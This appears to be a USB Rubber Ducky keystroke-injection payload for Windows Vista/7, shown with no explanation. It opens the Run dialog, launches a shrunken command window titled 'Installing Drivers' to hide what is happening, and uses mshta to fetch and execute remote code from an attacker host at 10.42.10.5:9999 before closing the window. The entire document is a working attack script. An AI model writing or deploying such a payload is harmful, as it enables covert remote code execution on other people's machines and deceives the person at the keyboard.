# rubber_payload

```
REM Target: WINDOWS VISTA/7
REM Encoder V2.4
REM Using the run command for a broader OS base.
DELAY 1000
GUI r
DELAY 500
STRING cmd /T:01 /K "@echo off&& mode con:COLS=35 LINES=1 && title Installing Drivers" 
DELAY 200
ENTER
DELAY 500
STRING mshta  http://10.42.10.5:9999/t & exit
DELAY 500
ENTER
DELAY 100
STRING exit
DELAY 500
ENTER
```
